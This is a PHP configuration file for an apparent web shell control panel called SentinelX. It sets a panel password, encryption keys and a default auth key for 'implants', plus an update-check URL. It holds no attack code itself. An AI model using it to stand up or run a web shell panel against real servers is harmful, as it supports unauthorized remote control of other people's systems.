<?php
/**
 * SentinelX WebShell Configuration
 */

// Panel login password (change this!)
define('PANEL_PASSWORD', 'sentinelx_admin');

// AES encryption key for implant communication (32 bytes, hex-encoded)
// Generate with: bin2hex(random_bytes(32))
define('CRYPTO_KEY', 'sentinelx_default_insecure_key_change_me_1234567');

// RSA keypair for implant communication (auto-generated if empty)
define('RSA_PUBLIC_KEY', '');
define('RSA_PRIVATE_KEY', '');

// Session timeout (seconds)
define('SESSION_TIMEOUT', 3600);

// Default auth key for new implants
define('DEFAULT_AUTH_KEY', 'sentinelx_2024');

// SentinelX version
define('SENTINELX_VERSION', '1.0.0');

// Update check URL (set to your release endpoint)
// Format: {"latest":"1.0.0","url":"https://github.com/...","notes":"..."}
define('UPDATE_CHECK_URL', 'https://raw.githubusercontent.com/SentinelXofficial/sxws/main/version.json');
